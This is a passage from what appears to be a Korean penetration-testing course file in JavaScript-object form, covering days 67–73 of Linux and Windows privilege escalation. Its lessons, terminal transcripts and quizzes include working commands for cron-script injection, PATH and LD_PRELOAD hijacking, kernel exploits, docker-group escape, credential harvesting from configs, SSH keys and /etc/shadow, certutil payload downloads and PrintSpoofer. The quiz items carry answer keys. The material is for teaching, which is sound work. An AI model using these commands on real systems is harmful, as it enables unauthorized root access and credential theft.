그게 root 실행으로 이어집니다. 관리자가 스크립트 권한을 느슨하게 두거나 상대경로·와일드카드를 쓰는 실수가 원인입니다.</p><p><b>실전:</b> <code>pspy</code>를 돌려 root cron을 포착하고, 그 스크립트·참조 파일의 권한을 확인합니다. 쓰기 가능한 것을 찾으면 리버스 셸이나 SUID 설정을 주입하고 다음 실행을 기다립니다.</p>",
term:"www-data@target$ cat /etc/crontab | grep -v '^#'\n*/5 * * * * root /opt/scripts/backup.sh\nwww-data@target$ ls -l /opt/scripts/backup.sh\n-rwxrwxrwx 1 root root ...   # 누구나 쓰기 가능!\nwww-data@target$ echo 'chmod +s /bin/bash' >> /opt/scripts/backup.sh\n# 5분 기다림 -> bash -p 로 root",
lab:["<code>cat /etc/crontab</code>·<code>ls -la /etc/cron.*</code>로 예약 작업을 본다","<code>pspy</code>로 파일에 안 보이는 root cron을 포착한다","cron이 실행하는 스크립트의 권한을 확인한다","쓰기 가능한 스크립트에 SUID 설정·리버스 셸을 주입한다","와일드카드를 쓰는 cron에 파일명 주입을 시험한다","스크립트가 참조하는 파일들의 권한도 확인한다","다음 실행을 기다려 root를 획득한다"],
q:[{t:"root cron이 실행하는 스크립트가 '누구나 쓰기 가능(777)'일 때 권한 상승 방법은?",o:["불가능","스크립트에 <code>chmod +s /bin/bash</code>나 리버스 셸을 추가하면, 다음 실행 때 root 권한으로 실행됨","비밀번호 크랙","포트 스캔"],a:1,
  e:"cron이 <b>root로</b> 그 스크립트를 실행하니, 내가 추가한 코드도 root로 돕니다. <code>chmod +s /bin/bash</code>를 넣어두면 다음 실행 후 <code>bash -p</code>로 root가 됩니다."},
   {t:"cron 작업을 찾는 데 <code>pspy</code>가 특히 유용한 이유는?",o:["더 예뻐서","crontab 파일에 안 보이거나 다른 사용자의 cron도, 실행되는 순간을 실시간으로 포착하기 때문","자동 익스플로잇","암호 크랙"],a:1,
    e:"<code>crontab -l</code>은 내 것만 봅니다. <code>pspy</code>는 <b>모든 프로세스·cron의 실행 순간</b>을 비권한으로 감시해, 파일로 안 보이는 root 작업을 잡아냅니다."},
   {t:"cron이 <code>tar -czf backup.tar.gz *</code>처럼 와일드카드를 쓸 때의 위험은?",o:["느림","폴더에 <code>--checkpoint-action=exec=sh</code> 같은 이름의 파일을 만들면 tar가 옵션으로 해석해 명령을 실행(와일드카드 주입)","용량 증가","암호화 실패"],a:1,
    e:"<code>*</code>가 파일명으로 확장될 때, <code>--checkpoint-action=...</code> 이름의 파일을 만들면 tar가 <b>옵션으로 오인</b>해 명령을 실행합니다. 와일드카드 + root cron은 위험한 조합입니다."}]},

{d:68,t:"PATH 하이재킹과 라이브러리 악용",g:"프로그램이 명령·라이브러리를 찾는 순서를 조작해 내 코드를 실행시킨다.",
c:"<p>프로그램이 명령이나 라이브러리를 <b>어디서 찾는지</b>를 조작하는 공격입니다.</p><p><b>PATH 하이재킹</b><br>스크립트·바이너리가 <b>절대경로 없이</b> 명령을 부르면(예: <code>system(\"cat /flag\")</code> 대신 상대적으로 <code>service</code>), 셸은 <code>$PATH</code>의 폴더들을 <b>순서대로</b> 뒤져 첫 번째로 찾은 걸 실행합니다.<br><b>악용</b>: 내가 <code>$PATH</code> 앞쪽에 있는 <b>쓰기 가능한 폴더</b>에 같은 이름의 악성 파일을 놓으면, 원본 대신 <b>내 것이 실행</b>됩니다.<br>SUID 바이너리나 root cron이 <code>service</code>를 상대경로로 부른다면:<br><code>cd /tmp; echo '/bin/bash -p' &gt; service; chmod +x service; export PATH=/tmp:$PATH</code> → 그 SUID/cron 실행 → 내 <code>service</code>가 root로.</p><p><b>찾는 법</b><br>커스텀 SUID 바이너리를 <code>strings</code>로 봐서 <b>절대경로 없는 명령 호출</b>을 찾습니다. <code>strings /usr/bin/custom | grep -v '/'</code>에 <code>service·id·cat</code> 등이 보이면 후보.</p><p><b>LD_PRELOAD / LD_LIBRARY_PATH</b><br>동적 라이브러리 로딩을 악용합니다.<br><b>LD_PRELOAD</b>: 프로그램 실행 전에 <b>내 라이브러리를 먼저</b> 로드시킵니다. sudo가 <code>env_keep+=LD_PRELOAD</code>면(Day 66), 악성 <code>.so</code>를 만들어 root 코드 실행.<br>악성 라이브러리 예: <code>void _init(){setuid(0);system(\"/bin/bash -p\");}</code>를 컴파일해 <code>sudo LD_PRELOAD=/tmp/x.so 명령</code>.</p><p><b>rpath / 쓰기 가능한 라이브러리</b><br>바이너리가 <b>쓰기 가능한 경로의 라이브러리</b>를 로드하면, 그 <code>.so</code>를 악성으로 교체합니다. <code>ldd</code>로 의존 라이브러리와 경로를 확인.</p><p><b>왜 통하나:</b> '어디서 찾을지'가 <b>환경변수·순서에 의존</b>하는데, 그 순서를 낮은 권한이 통제할 수 있으면 <b>무엇을 실행할지</b>를 바꿉니다. 개발자가 절대경로를 안 쓰거나 환경변수를 신뢰하는 실수가 원인입니다.</p><p><b>실전:</b> 커스텀 SUID·cron 스크립트를 분석해 상대경로 명령 호출을 찾고, PATH를 조작해 하이재킹합니다. sudo env_keep에 LD_PRELOAD가 있으면 악성 라이브러리로 상승합니다.</p>",
term:"# PATH 하이재킹 (커스텀 SUID가 'service'를 상대경로로 호출)\nwww-data@target$ cd /tmp\nwww-data@target$ echo '#!/bin/bash\\n/bin/bash -p' > service\nwww-data@target$ chmod +x service\nwww-data@target$ export PATH=/tmp:$PATH\nwww-data@target$ /usr/bin/custom_suid   # service 대신 내 것 실행\nroot@target# id",
lab:["커스텀 SUID를 <code>strings</code>로 분석해 상대경로 명령 호출을 찾는다","<code>$PATH</code> 앞에 쓰기 가능한 폴더를 추가한다","원본과 같은 이름의 악성 스크립트를 놓는다","SUID/cron 실행으로 하이재킹이 되는지 확인한다","sudo <code>env_keep+=LD_PRELOAD</code> 여부를 확인한다","악성 <code>.so</code>를 컴파일해 LD_PRELOAD로 상승한다","<code>ldd</code>로 쓰기 가능한 라이브러리 경로를 찾는다"],
q:[{t:"PATH 하이재킹이 가능한 조건은?",o:["항상","프로그램이 명령을 절대경로 없이 호출하고, 공격자가 $PATH 앞쪽의 쓰기 가능한 폴더에 같은 이름 파일을 놓을 수 있을 때","암호가 약할 때","포트가 열릴 때"],a:1,
  e:"명령을 <b>상대적으로</b> 부르면 셸이 <code>$PATH</code> 순서대로 찾습니다. 앞쪽 쓰기 가능 폴더에 <b>같은 이름의 악성 파일</b>을 놓으면 원본 대신 내 것이 실행됩니다. root 컨텍스트(SUID·cron)에서 치명적입니다."},
   {t:"<code>LD_PRELOAD</code>를 악용한 권한 상승의 원리는?",o:["파일을 삭제","프로그램 실행 전에 공격자의 공유 라이브러리를 먼저 로드시켜, 그 안의 코드를 프로그램(root) 권한으로 실행","네트워크 스캔","비밀번호 추측"],a:1,
    e:"<code>LD_PRELOAD</code>는 <b>지정한 라이브러리를 먼저 로드</b>합니다. sudo가 이 환경변수를 유지하면(env_keep), 악성 <code>.so</code>의 <code>_init</code>이 root로 실행되어 셸을 엽니다."},
   {t:"커스텀 SUID 바이너리에서 PATH 하이재킹 후보를 찾는 방법은?",o:["실행만 해본다","<code>strings</code>로 절대경로(/) 없는 명령 호출을 찾는다","포트를 스캔","재부팅"],a:1,
    e:"<code>strings /usr/bin/custom</code>에서 <code>service·id·cat</code> 같은 <b>슬래시 없는 명령</b>이 보이면, 상대경로로 부르는 것이라 PATH 하이재킹 후보입니다."}]},

{d:69,t:"커널 익스플로잇",g:"취약한 커널 버전을 공개 익스플로잇으로 공략한다 — 마지막 수단으로.",
c:"<p>다른 방법이 다 막히면 <b>커널 자체의 취약점</b>을 노립니다. 강력하지만 <b>마지막 수단</b>입니다 — 표적을 다운시킬 위험이 있으니까요.</p><p><b>원리</b><br>커널은 <b>root 권한으로</b> 돕니다. 커널의 버그(메모리 손상 등)를 악용하면 <b>임의 코드를 root로</b> 실행하거나 UID를 0으로 바꿉니다. 애플리케이션 권한과 무관하게 <b>커널 버전 하나로</b> 상승합니다.</p><p><b>버전 확인</b><br><code>uname -a</code>, <code>cat /proc/version</code>, <code>cat /etc/os-release</code>. 커널 버전과 배포판을 정확히 파악합니다.</p><p><b>익스플로잇 찾기</b><br><code>searchsploit linux kernel 4.4</code> · 구글 <code>'커널버전' privilege escalation exploit</code>.<br><b>linux-exploit-suggester(les.sh)</b> — 커널 버전에 맞는 알려진 익스플로잇을 자동 추천. linpeas도 표시해줍니다.</p><p><b>유명한 커널 익스플로잇</b><br>· <b>DirtyCow(CVE-2016-5195)</b> — 오래된 커널의 COW 버그. 읽기전용 파일을 씀 → <code>/etc/passwd</code> 조작.<br>· <b>DirtyPipe(CVE-2022-0847)</b> — 최신에 가까운 커널(5.8~). 파이프로 읽기전용 파일 덮어쓰기.<br>· <b>PwnKit(CVE-2021-4034)</b> — 커널은 아니지만 <code>pkexec</code>(거의 모든 리눅스에 SUID)의 취약점. 매우 널리 통함.<br>· <b>OverlayFS</b> 계열 등.</p><p><b>주의 — 왜 마지막 수단인가</b><br>① <b>표적이 죽을 수 있음</b>: 커널 익스플로잇 실패는 <b>커널 패닉(시스템 다운)</b>을 일으킵니다. 운영 시스템에선 재앙.<br>② <b>불안정</b>: 커널 버전·설정에 민감해 정확히 안 맞으면 실패.<br>③ <b>시끄러움</b>: 크래시·로그를 남깁니다.<br>그래서 <b>sudo·SUID·cron 같은 오설정을 먼저</b> 다 시도하고, 안 되면 커널로 갑니다. <code>pkexec</code>(PwnKit)는 안정적이라 예외적으로 자주 씁니다.</p><p><b>실전:</b> linux-exploit-suggester로 후보를 뽑고, <b>코드를 읽어</b> 커널 버전이 정확히 맞는지 확인한 뒤(안 맞으면 표적 손상), 컴파일해 실행합니다. 컴파일 도구가 표적에 없으면 Kali에서 맞는 아키텍처로 빌드해 전송합니다.</p>",
term:"www-data@target$ uname -a\nLinux target 4.4.0-31-generic x86_64\nwww-data@target$ ./les.sh   # linux-exploit-suggester\n[+] CVE-2016-5195 (dirtycow)  probability: high\nwww-data@target$ gcc dirtycow.c -o dc -pthread && ./dc\n# root 획득 (하지만 표적이 불안정해질 수 있음)",
lab:["<code>uname -a</code>로 커널 버전을 정확히 확인한다","<code>linux-exploit-suggester</code>로 후보를 뽑는다","<code>searchsploit</code>로 커널 익스플로잇을 찾는다","익스플로잇 코드를 읽어 버전 적합성을 확인한다","<code>pkexec</code> 취약점(PwnKit) 여부를 확인한다","컴파일 도구가 없으면 Kali에서 빌드해 전송한다","왜 커널이 마지막 수단인지 정리한다"],
q:[{t:"커널 익스플로잇이 '마지막 수단'인 이유는?",o:["느려서","실패 시 커널 패닉(시스템 다운)을 일으키고, 버전에 민감해 불안정하며 크래시 로그를 남기기 때문","불법이라서","항상 실패해서"],a:1,
  e:"커널 익스플로잇 실패는 <b>시스템 다운</b>입니다. 운영 시스템에선 재앙이죠. 버전에 민감해 불안정하기도 합니다. 그래서 <b>sudo·SUID·cron 오설정을 먼저</b> 시도합니다."},
   {t:"PwnKit(CVE-2021-4034)이 널리 통하는 이유는?",o:["느려서","거의 모든 리눅스에 SUID로 설치된 <code>pkexec</code>의 취약점이라, 대상이 매우 넓고 안정적이기 때문","커널 버그라","윈도우 전용"],a:1,
    e:"<code>pkexec</code>는 <b>거의 모든 리눅스에 기본 SUID</b>로 있습니다. PwnKit은 커널이 아닌 이 바이너리의 취약점이라 <b>대상이 넓고 안정적</b>이어서, 커널 익스플로잇보다 선호됩니다."},
   {t:"커널 익스플로잇을 실행하기 전 반드시 할 일은?",o:["재부팅","코드를 읽어 커널 버전이 정확히 맞는지 확인(안 맞으면 표적 손상 위험)","비밀번호 변경","포트 스캔"],a:1,
    e:"버전이 <b>정확히 맞지 않으면</b> 익스플로잇이 실패하며 커널을 손상시킵니다. 코드를 읽어 대상 버전을 확인하고, 컴파일러가 없으면 Kali에서 맞는 아키텍처로 빌드합니다."}]},

{d:70,t:"리눅스 능력·특수 권한·컨테이너",g:"capabilities, 위험한 그룹, 컨테이너 탈출로 상승하는 경로를 익힌다.",
c:"<p>SUID·sudo·cron 외에도 리눅스에는 상승 경로가 많습니다. 자주 나오는 것들을 정리합니다.</p><p><b>리눅스 능력(Capabilities)</b><br>SUID의 세분화 버전. 바이너리에 <b>특정 root 권한만</b> 부여합니다.<br><code>getcap -r / 2&gt;/dev/null</code>로 찾습니다. 위험한 것:<br>· <code>cap_setuid</code>: <code>python</code>에 붙으면 <code>os.setuid(0)</code>로 root. <code>python -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'</code>.<br>· <code>cap_dac_read_search</code>: 모든 파일 읽기(<code>/etc/shadow</code>).<br>GTFOBins에 'Capabilities' 섹션이 있습니다.</p><p><b>위험한 그룹</b><br><code>id</code>로 내 그룹을 봅니다.<br>· <b>docker</b>: <code>docker run -v /:/mnt -it alpine chroot /mnt sh</code> → 호스트 루트를 마운트해 root. docker 그룹 = 사실상 root.<br>· <b>lxd/lxc</b>: 컨테이너로 호스트 파일시스템 마운트 → root.<br>· <b>disk</b>: <code>/dev/sda</code>를 직접 읽어 <code>/etc/shadow</code> 추출.<br>· <b>adm</b>: 로그 읽기(자격증명).</p><p><b>NFS no_root_squash</b><br><code>cat /etc/exports</code>에 <code>no_root_squash</code>가 있으면, 내 머신에서 그 공유를 마운트해 <b>root 소유 SUID 바이너리를 심고</b> 표적에서 실행 → root.</p><p><b>컨테이너 탈출</b><br>셸이 <b>컨테이너 안</b>이면(<code>/.dockerenv</code> 존재), 호스트로 탈출을 노립니다.<br>· <b>특권 컨테이너</b>(<code>--privileged</code>): 호스트 장치 접근으로 탈출.<br>· <b>마운트된 docker.sock</b>: <code>/var/run/docker.sock</code>이 보이면 새 특권 컨테이너를 띄워 호스트 장악.<br>· 취약한 커널·오설정.</p><p><b>왜 다양한가:</b> 리눅스는 권한을 <b>여러 메커니즘</b>(SUID·capabilities·그룹·마운트·네임스페이스)으로 나눕니다. 각각이 잘못 설정되면 상승 경로가 됩니다. 그래서 열거가 넓어야 합니다 — linpeas가 이걸 다 점검하는 이유입니다.</p><p><b>실전:</b> <code>getcap -r /</code>, <code>id</code>(그룹), <code>cat /etc/exports</code>, <code>/.dockerenv</code>를 확인합니다. docker·lxd 그룹이면 거의 즉시 root, capabilities는 GTFOBins로 악용합니다.</p>",
term:"# capabilities로 상승\nwww-data@target$ getcap -r / 2>/dev/null\n/usr/bin/python3.8 = cap_setuid+ep    # setuid 능력!\nwww-data@target$ /usr/bin/python3.8 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'\nroot@target# id\n# docker 그룹이면:\n$ docker run -v /:/mnt -it alpine chroot /mnt sh   # 호스트 root",
lab:["<code>getcap -r / 2>/dev/null</code>로 능력이 부여된 바이너리를 찾는다","<code>cap_setuid</code>가 붙은 바이너리로 상승을 시험한다","<code>id</code>로 docker·lxd·disk 등 위험 그룹 소속을 확인한다","docker 그룹이면 호스트 루트를 마운트해 root를 얻는다","<code>cat /etc/exports</code>로 NFS no_root_squash를 확인한다","<code>/.dockerenv</code>로 컨테이너 안인지 확인한다","<code>docker.sock</code> 노출 여부를 점검한다"],
q:[{t:"사용자가 <b>docker 그룹</b>에 속하면 사실상 root인 이유는?",o:["docker가 느려서","<code>docker run -v /:/mnt</code>로 호스트 전체를 컨테이너에 마운트해 chroot하면 호스트 root 파일시스템을 제어할 수 있어서","암호를 알아서","포트가 열려서"],a:1,
  e:"docker 데몬은 root로 돕니다. docker 그룹 사용자는 <b>호스트 루트(/)를 컨테이너에 마운트</b>해 그 안에서 root로 조작할 수 있으니, docker 그룹 = root입니다."},
   {t:"바이너리에 <code>cap_setuid</code> capability가 붙어 있으면?",o:["안전","그 바이너리로 UID를 0(root)으로 바꿀 수 있어, 예를 들어 python이면 os.setuid(0)로 root 셸 획득","느려짐","네트워크 노출"],a:1,
    e:"<code>cap_setuid</code>는 <b>UID 변경 권한</b>입니다. python에 붙으면 <code>os.setuid(0)</code> 후 셸을 열어 root가 됩니다. SUID의 세분화 버전이라 <code>getcap</code>으로 점검합니다."},
   {t:"NFS export의 <code>no_root_squash</code>가 위험한 이유는?",o:["느려서","공격자가 자기 머신에서 그 공유에 root 소유 SUID 바이너리를 심어, 표적에서 실행해 root를 얻을 수 있어서","암호 때문","용량 때문"],a:1,
    e:"<code>no_root_squash</code>는 원격의 root를 <b>공유에서도 root로</b> 인정합니다. 내 머신(root)으로 공유에 SUID 셸을 심고 표적에서 실행하면 root가 됩니다."}]},

{d:71,t:"자격증명 수집 — 리눅스",g:"침투한 시스템에서 비밀번호·키·해시를 긁어모아 다음 단계로 잇는다.",
c:"<p>권한 상승과 나란히, <b>자격증명 수집</b>은 침투의 핵심입니다. 얻은 비밀번호·키는 <b>다른 계정·다른 호스트(내부 이동)</b>의 열쇠가 됩니다.</p><p><b>어디를 뒤지나</b><br><b>홈 디렉터리</b>: <code>.bash_history</code>·<code>.zsh_history</code>(명령에 비밀번호가!), <code>.ssh/</code>(개인키·known_hosts), <code>.config/</code>, <code>.aws/credentials</code>, <code>.git-credentials</code>.<br><b>설정·소스</b>: <code>config.php</code>·<code>.env</code>·<code>wp-config.php</code>·<code>settings.py</code>(DB·API 비밀번호), 백업 파일.<br><b>웹 루트</b>: <code>grep -r 'password\\|api_key\\|secret' /var/www 2&gt;/dev/null</code>.<br><b>로그</b>: 가끔 비밀번호가 로그에 찍힘.<br><b>메모리·프로세스</b>: <code>ps aux</code>에 명령줄 인자로 비밀번호가 노출.</p><p><b>해시 — root면 /etc/shadow</b><br>root를 얻었으면 <code>/etc/shadow</code>의 해시를 <code>/etc/passwd</code>와 합쳐(<code>unshadow</code>) <b>오프라인 크래킹</b>: <code>john --wordlist=rockyou.txt hashes</code>, <code>hashcat -m 1800</code>(sha512crypt). 다른 사용자의 평문 비밀번호를 얻어 재사용합니다.</p><p><b>SSH 키</b><br><code>.ssh/id_rsa</code>를 찾으면 즉시 그 계정·다른 호스트로 로그인. <code>authorized_keys</code>·<code>known_hosts</code>로 <b>어디로 연결되는지</b> 파악(내부 이동 지도).</p><p><b>비밀번호 재사용</b><br>사람은 비밀번호를 재사용합니다. 한 곳에서 얻은 비밀번호를 <b>모든 계정·서비스(SSH·DB·sudo)</b>에 시도합니다. <code>su - user</code>로 다른 사용자 전환도 시도.</p><p><b>자동화</b><br>linpeas가 자격증명 후보를 하이라이트합니다. <b>LaZagne</b>(리눅스/윈도우)는 저장된 비밀번호를 자동 수집합니다.</p><p><b>왜 중요한가:</b> 권한 상승이 '수직'이라면 자격증명은 '수평·확장'의 열쇠입니다. root가 못 돼도, 얻은 SSH 키·DB 비밀번호로 <b>다른 시스템</b>에 발판을 넓힙니다. 실전 침투는 결국 <b>자격증명의 연쇄</b>입니다 — 방어 코스에서 배운 'pass-the-hash·자격증명 재사용'의 공격 쪽입니다.</p><p><b>실전:</b> 셸을 잡으면 홈·설정·웹루트를 <code>grep</code>으로 훑고, SSH 키를 찾고, root면 shadow를 크랙합니다. 얻은 모든 자격증명을 다른 계정·호스트에 재사용해봅니다.</p>",
term:"www-data@target$ grep -rn 'password\\|DB_PASS\\|secret' /var/www 2>/dev/null | head\n/var/www/html/config.php:  define('DB_PASS','Summ3r2024!');\nwww-data@target$ cat /home/deploy/.ssh/id_rsa   # 개인키\nwww-data@target$ su - deploy    # 얻은 비밀번호 재사용\ndeploy@target$ sudo -l          # 이 계정의 권한 재확인",
lab:["홈의 <code>.bash_history</code>·<code>.ssh</code>·설정 파일을 뒤진다","<code>grep -r 'password\\|secret'</code>로 웹루트·설정을 훑는다","SSH 개인키(<code>id_rsa</code>)를 찾아 다른 계정 로그인을 시도한다","root면 <code>/etc/shadow</code>를 unshadow해 크랙한다","<code>ps aux</code>에서 명령줄의 비밀번호 노출을 확인한다","얻은 비밀번호를 다른 계정·서비스에 재사용한다","<code>.aws/credentials</code>·<code>.git-credentials</code>를 확인한다"],
q:[{t:"권한 상승(수직)과 비교해 자격증명 수집이 갖는 역할은?",o:["같은 것","다른 계정·다른 호스트로 확장(수평·내부 이동)하는 열쇠 — root가 못 돼도 얻은 키·비밀번호로 발판을 넓힘","느림","불필요"],a:1,
  e:"권한 상승이 <b>위로</b>라면 자격증명은 <b>옆으로</b> 뻗는 열쇠입니다. SSH 키·DB 비밀번호로 다른 시스템에 발판을 넓혀, 침투를 확장합니다."},
   {t:"root 획득 후 <code>/etc/shadow</code>를 노리는 이유는?",o:["삭제하려고","다른 사용자들의 비밀번호 해시를 오프라인 크래킹해 평문을 얻어, 그 비밀번호를 다른 곳에 재사용하려고","용량 확보","백업"],a:1,
    e:"<code>/etc/shadow</code>는 해시 저장소입니다. root로 읽어 <code>john·hashcat</code>으로 크랙하면 <b>평문 비밀번호</b>가 나오고, 사람들의 비밀번호 재사용 습관 덕에 다른 시스템에도 통합니다."},
   {k:"cmd",t:"웹 루트 <code>/var/www</code>에서 <b>password가 포함된 줄</b>을 재귀적으로(줄번호 포함) 찾되 오류는 버리는 명령을 입력하세요.",
    ph:"grep ...","a":["grep -rn 'password' /var/www 2>/dev/null"],
    "re":["^grep\\s+-rn\\s+['\"]?password['\"]?\\s+/var/www/?\\s+2>/dev/null$","^grep\\s+-rn\\s+/var/www/?\\s+-e\\s+['\"]?password['\"]?\\s+2>/dev/null$"],
    hint:"재귀(-r)·줄번호(-n)로 검색하고 오류는 /dev/null로.",
    e:"<code>grep -rn 'password' /var/www 2>/dev/null</code> — 방어 코스에서 배운 grep이 이제 자격증명 사냥 도구입니다. config·.env에서 DB 비밀번호가 그대로 나오는 경우가 흔합니다."}]},

{d:72,t:"윈도우 권한 상승 — 기초와 열거",g:"윈도우에서 발판을 잡은 뒤 권한 상승 벡터를 체계적으로 수집한다.",
c:"<p>리눅스를 했으니 <b>윈도우</b>로 넘어갑니다. 원리는 같습니다 — 낮은 권한(일반 사용자)에서 <b>SYSTEM/Administrator</b>로. 방법이 다를 뿐입니다.</p><p><b>목표 권한</b><br>리눅스의 root에 해당하는 것이 <b>NT AUTHORITY\\SYSTEM</b>(최고)과 <b>Administrator</b>입니다.</p><p><b>초기 열거</b><br><code>whoami /all</code> — 내 사용자·그룹·<b>권한(privileges)</b>. 권한 목록이 핵심.<br><code>whoami /priv</code> — 보유 권한. <code>SeImpersonate·SeAssignPrimaryToken·SeBackup·SeDebug</code>가 있으면 상승 경로.<br><code>systeminfo</code> — OS 버전·패치(핫픽스). 빠진 패치 = 커널 익스플로잇 후보.<br><code>net user</code>·<code>net localgroup administrators</code> — 사용자·관리자 그룹.<br><code>ipconfig /all</code>·<code>netstat -ano</code> — 네트워크.</p><p><b>자동 도구</b><br><b>winPEAS</b>(리눅스 linpeas의 윈도우판) — 모든 벡터를 자동 점검.<br><b>PowerUp.ps1</b>(PowerSploit) — 서비스·레지스트리 오설정 점검·자동 악용.<br><b>Seatbelt</b> — 상세 시스템 정보 수집.<br>PowerShell 실행이 막히면 <code>-ep bypass</code>·인코딩 우회.</p><p><b>주요 상승 벡터(다음 날들)</b><br>· <b>서비스 오설정</b>: 취약한 서비스 권한·경로.<br>· <b>SeImpersonate 권한</b>: Potato 계열 익스플로잇으로 SYSTEM.<br>· <b>AlwaysInstallElevated</b>: MSI를 SYSTEM으로 설치.<br>· <b>저장된 자격증명</b>: 레지스트리·파일.<br>· <b>미패치 커널</b>: 핫픽스 누락.</p><p><b>파일 전송(윈도우)</b><br><code>certutil -urlcache -f http://내IP/winpeas.exe wp.exe</code> · PowerShell <code>iwr http://내IP/x -o x</code> · SMB 공유.</p><p><b>왜 원리가 같은가:</b> 윈도우도 결국 <b>오설정·과도한 권한·미패치·저장된 자격증명</b>이 상승 경로입니다. 리눅스의 sudo·SUID·cron·커널에 대응하는 것이 윈도우의 서비스·권한·스케줄 작업·핫픽스입니다. <b>열거 → 오설정 발견 → 악용</b>의 흐름은 동일합니다.</p><p><b>실전:</b> <code>whoami /priv</code>와 <code>systeminfo</code>부터 봅니다. winPEAS·PowerUp로 벡터를 수집하고, <code>SeImpersonate</code>가 있으면 그것부터 노립니다(다음 날).</p>",
term:"C:\\> whoami /priv\nSeImpersonatePrivilege    Enabled   <- Potato로 SYSTEM 가능!\nSeChangeNotifyPrivilege   Enabled\nC:\\> systeminfo | findstr /B /C:\"OS\" /C:\"Hotfix\"\nOS Version: 10.0.17763 N/A Build 17763\nHotfix(s): 3 Hotfix(s) Installed   <- 패치 적음",
lab:["<code>whoami /all</code>·<code>whoami /priv</code>로 권한을 확인한다","<code>systeminfo</code>로 OS 버전·핫픽스를 본다","<code>net user</code>·<code>net localgroup administrators</code>로 계정을 본다","winPEAS를 전송해 실행한다","PowerUp.ps1로 서비스 오설정을 점검한다","<code>SeImpersonate</code> 등 위험 권한 보유를 확인한다","리눅스와 윈도우 상승 벡터를 대응시켜 정리한다"],
q:[{t:"윈도우에서 리눅스의 root에 해당하는 최고 권한 계정은?",o:["Administrator만","NT AUTHORITY\\SYSTEM (그리고 Administrator)","Guest","User"],a:1,
  e:"<b>NT AUTHORITY\\SYSTEM</b>이 최고 권한이고, Administrator도 관리 권한입니다. 권한 상승의 목표는 일반 사용자에서 이 둘 중 하나로 올라가는 것입니다."},
   {t:"윈도우 권한 상승에서 <code>whoami /priv</code>를 확인하는 이유는?",o:["이름 확인","<code>SeImpersonate·SeBackup·SeDebug</code> 같은 위험 권한 보유 여부가 직접적인 상승 경로이기 때문","네트워크 확인","시간 확인"],a:1,
    e:"윈도우는 <b>권한(privilege)</b>으로 능력을 세분합니다. <code>SeImpersonate</code>가 있으면 Potato 익스플로잇으로 SYSTEM이 되는 식이라, 권한 목록이 상승 경로를 직접 알려줍니다."},
   {t:"리눅스와 윈도우 권한 상승의 공통 원리는?",o:["완전히 다름","열거 → 오설정·과도한 권한·미패치·저장된 자격증명 발견 → 악용의 흐름이 동일(메커니즘만 다름)","윈도우가 항상 쉬움","리눅스만 가능"],a:1,
    e:"둘 다 <b>오설정·과도한 권한·미패치·자격증명</b>이 경로입니다. sudo·SUID·cron·커널 ↔ 서비스·권한·스케줄·핫픽스로 대응될 뿐, <b>열거→발견→악용</b> 흐름은 같습니다."}]},

{d:73,t:"윈도우 서비스·권한 악용",g:"서비스 오설정과 SeImpersonate 권한으로 SYSTEM을 획득한다.",
c:"<p>윈도우에서 가장 흔한 상승 경로들입니다.</p><p><b>서비스 오설정</b><br>윈도우 서비스는 보통 <b>SYSTEM으로</b> 실행됩니다. 서비스 설정에 허점이 있으면 SYSTEM 코드 실행이 됩니다.<br>· <b>Unquoted Service Path</b>: 서비스 경로에 공백이 있고 따옴표가 없으면(<code>C:\\Program Files\\My App\\svc.exe</code>), 윈도우가 <code>C:\\Program.exe</code>부터 찾습니다. 그 경로에 쓸 수 있으면 악성 exe를 놓아 SYSTEM으로 실행.<br>· <b>약한 서비스 권한</b>: 서비스 설정을 내가 바꿀 수 있으면(<code>sc config</code>), 실행 파일 경로를 내 것으로 교체.<br>· <b>쓰기 가능한 서비스 실행 파일</b>: exe 자체를 덮어씀.<br>PowerUp의 <code>Invoke-AllChecks</code>가 이걸 자동 점검·악용합니다.</p><p><b>SeImpersonate → Potato 계열</b><br><code>whoami /priv</code>에 <b>SeImpersonatePrivilege</b>가 있으면(웹서버·DB 서비스 계정은 대개 보유), <b>Potato 익스플로잇</b>으로 SYSTEM 토큰을 훔칩니다.<br>· <b>PrintSpoofer·RoguePotato·GodPotato·JuicyPotato</b> — 버전·환경에 맞게.<br><code>PrintSpoofer.exe -i -c cmd</code> → SYSTEM 셸. 서비스 계정 침투 후 <b>가장 흔한 SYSTEM 획득법</b>입니다.</p><p><b>AlwaysInstallElevated</b><br>레지스트리 두 곳이 1이면, 모든 사용자가 <b>MSI를 SYSTEM 권한으로 설치</b>할 수 있습니다.<br><code>reg query HKLM\\...\\Installer</code>로 확인 → <code>msfvenom -f msi</code>로 악성 MSI 생성 → <code>msiexec /i evil.msi</code> → SYSTEM.</p><p><b>스케줄 작업</b><br>리눅스 cron처럼, SYSTEM으로 도는 스케줄 작업이 <b>쓰기 가능한 스크립트·exe</b>를 실행하면 악용.</p><p><b>왜 서비스가 핵심인가:</b> 서비스는 <b>SYSTEM으로 자동 실행</b>되므로, 하나의 오설정이 곧 SYSTEM입니다. 리눅스의 SUID·cron에 대응합니다. 그리고 <code>SeImpersonate</code>는 웹·DB 서비스 계정이 기본 보유해, <b>웹 침투 → 서비스 계정 셸 → Potato → SYSTEM</b>이 실전의 정석 경로입니다.</p><p><b>실전:</b> PowerUp/winPEAS로 서비스 오설정을 찾고, <code>SeImpersonate</code>가 있으면 PrintSpoofer로 SYSTEM을 잡습니다. AlwaysInstallElevated·스케줄 작업도 확인합니다.</p>",
term:"C:\\> whoami /priv | findstr Impersonate\nSeImpersonatePrivilege   Enabled\nC:\\> PrintSpoofer.exe -i -c cmd\n[+] Found privilege: SeImpersonatePrivilege\n[+] Named pipe listening...\nnt authority\\system    <- SYSTEM 획득",
lab:["PowerUp <code>Invoke-AllChecks</code>로 서비스 오설정을 점검한다","Unquoted Service Path를 찾아 악용 가능성을 본다","약한 권한 서비스의 실행 경로 교체를 시험한다","<code>whoami /priv</code>로 SeImpersonate 보유를 확인한다","PrintSpoofer로 SYSTEM 셸을 획득한다","AlwaysInstallElevated 레지스트리를 확인한다","SYSTEM으로 도는 스케줄 작업을 점검한다"],
q:[{t:"Unquoted Service Path 취약점의 원리는?",o:["암호가 약함","서비스 경로에 공백이 있고 따옴표가 없으면 윈도우가 공백 이전 경로(C:\\Program.exe)부터 실행을 시도하므로, 그 경로에 악성 exe를 놓으면 SYSTEM으로 실행","포트가 열림","커널 버그"],a:1,
